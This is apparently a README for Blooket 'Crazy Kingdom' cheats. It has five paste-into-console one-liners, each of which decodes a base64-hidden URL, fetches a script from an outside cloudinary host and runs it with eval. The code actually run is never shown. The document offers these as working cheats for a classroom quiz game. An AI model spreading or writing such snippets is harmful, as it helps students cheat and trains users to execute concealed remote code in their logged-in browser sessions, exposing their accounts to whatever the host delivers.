**Discord server: https://discord.gg/K5xUbuDqmG**

**These bookmarklets are also on: https://schoolcheats.net/blooket**

# crazy-kingdom

This cheat only works in crazy kingdom gamemode!

# ChoiceESP.js

Open console (ctrl + shift + j) and paste the following:
```js
fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDY3MTY3L2NrQ2hvaWNlRVNQLmpz')).then((res) => res.text().then((t) => eval(t)))
```

# MaxResources.js

Open console (ctrl + shift + j) and paste the following:
```js
fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDY3MTY3L2NrTWF4UmVzb3VyY2VzLmpz')).then((res) => res.text().then((t) => eval(t)))
```

# NoTaxes.js

Open console (ctrl + shift + j) and paste the following:
```js
fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDY3MTY3L2NrTm9UYXhlcy5qcw==')).then((res) => res.text().then((t) => eval(t)))
```

# SetGuests.js

Open console (ctrl + shift + j) and paste the following:
```js
fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDY3MTY3L2NrU2V0R3Vlc3RzLmpz')).then((res) => res.text().then((t) => eval(t)))
```

# SkipGuests.js

Open console (ctrl + shift + j) and paste the following:
```js
fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDY3MTY3L2NrU2tpcEd1ZXN0cy5qcw==')).then((res) => res.text().then((t) => eval(t)))
```
